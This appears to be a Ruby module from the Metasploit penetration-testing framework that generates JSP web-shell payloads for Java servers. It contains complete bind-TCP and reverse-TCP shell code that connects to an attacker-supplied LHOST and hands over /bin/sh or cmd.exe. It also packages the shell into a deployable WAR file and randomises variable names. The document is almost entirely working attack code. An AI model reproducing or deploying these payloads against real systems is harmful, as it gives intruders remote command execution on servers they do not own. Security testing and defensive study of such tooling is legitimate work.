# -*- coding: binary -*-
require 'msf/core'
require 'rex'

# This module is chained within JSP payloads that target the Java platform.
# It provides methods to generate Java / JSP code.
module Msf::Payload::JSP

  # @param [Hash<Symbol, [String, nil]>] info
  def initialize(info = {})
    ret = super(info)

    register_options([
      Msf::OptString.new( 'SHELL', [false, 'The system shell to use.'])
    ], Msf::Payload::JSP )

    ret
  end

  # Outputs jsp that spawns a bind TCP shell
  #
  # @return [String] jsp code that executes bind TCP payload
  def jsp_bind_tcp
    # Modified from: http://www.security.org.sg/code/jspreverse.html

    var_is = Rex::Text.rand_text_alpha_lower(2)
    var_os = Rex::Text.rand_text_alpha_lower(2)
    var_in = Rex::Text.rand_text_alpha_lower(2)
    var_out = Rex::Text.rand_text_alpha_lower(3)

    jsp = <<-EOS
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream #{var_is};
    OutputStream #{var_os};

    StreamConnector( InputStream #{var_is}, OutputStream #{var_os} )
    {
      this.#{var_is} = #{var_is};
      this.#{var_os} = #{var_os};
    }

    public void run()
    {
      BufferedReader #{var_in}  = null;
      BufferedWriter #{var_out} = null;
      try
      {
        #{var_in}  = new BufferedReader( new InputStreamReader( this.#{var_is} ) );
        #{var_out} = new BufferedWriter( new OutputStreamWriter( this.#{var_os} ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = #{var_in}.read( buffer, 0, buffer.length ) ) > 0 )
        {
          #{var_out}.write( buffer, 0, length );
          #{var_out}.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( #{var_in} != null )
          #{var_in}.close();
        if( #{var_out} != null )
          #{var_out}.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    #{shell_path}
    ServerSocket server_socket = new ServerSocket( #{datastore['LPORT'].to_s} );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
    EOS

    jsp
  end

  # Outputs jsp code that spawns a reverse TCP shell
  #
  # @return [String] jsp code that executes reverse TCP payload
  def jsp_reverse_tcp
    # JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html

    var_is = Rex::Text.rand_text_alpha_lower(2)
    var_os = Rex::Text.rand_text_alpha_lower(2)
    var_in = Rex::Text.rand_text_alpha_lower(2)
    var_out = Rex::Text.rand_text_alpha_lower(3)

    jsp = <<-EOS
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream #{var_is};
    OutputStream #{var_os};

    StreamConnector( InputStream #{var_is}, OutputStream #{var_os} )
    {
      this.#{var_is} = #{var_is};
      this.#{var_os} = #{var_os};
    }

    public void run()
    {
      BufferedReader #{var_in}  = null;
      BufferedWriter #{var_out} = null;
      try
      {
        #{var_in}  = new BufferedReader( new InputStreamReader( this.#{var_is} ) );
        #{var_out} = new BufferedWriter( new OutputStreamWriter( this.#{var_os} ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = #{var_in}.read( buffer, 0, buffer.length ) ) > 0 )
        {
          #{var_out}.write( buffer, 0, length );
          #{var_out}.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( #{var_in} != null )
          #{var_in}.close();
        if( #{var_out} != null )
          #{var_out}.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    #{shell_path}
    Socket socket = new Socket( "#{datastore['LHOST']}", #{datastore['LPORT'].to_s} );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
    EOS

    jsp
  end

  # Wraps the jsp payload into a war
  #
  # @return [Rex::Zip::Jar] a war to execute the jsp payload
  def generate_war
    jsp_name = "#{Rex::Text.rand_text_alpha_lower(rand(8)+8)}.jsp"

    zip = Rex::Zip::Jar.new

    web_xml = <<-EOF
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
  <welcome-file-list>
    <welcome-file>#{jsp_name}</welcome-file>
  </welcome-file-list>
</web-app>
    EOF

    zip.add_file("WEB-INF/", '')
    zip.add_file("WEB-INF/web.xml", web_xml)
    zip.add_file(jsp_name, generate)

    zip
  end

  # Outputs Java code to assign the system shell path to a variable.
  #
  # It uses the datastore if a value has been provided, otherwise
  # tries to guess the system shell path bad on the os target.
  #
  # @return [String] the Java code.
  def shell_path
    if datastore['SHELL'] && !datastore['SHELL'].empty?
      jsp =  "String ShellPath = \"#{datastore['SHELL']}\";"
    else
      jsp = <<-EOS
String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}
      EOS
    end

    jsp
  end

end
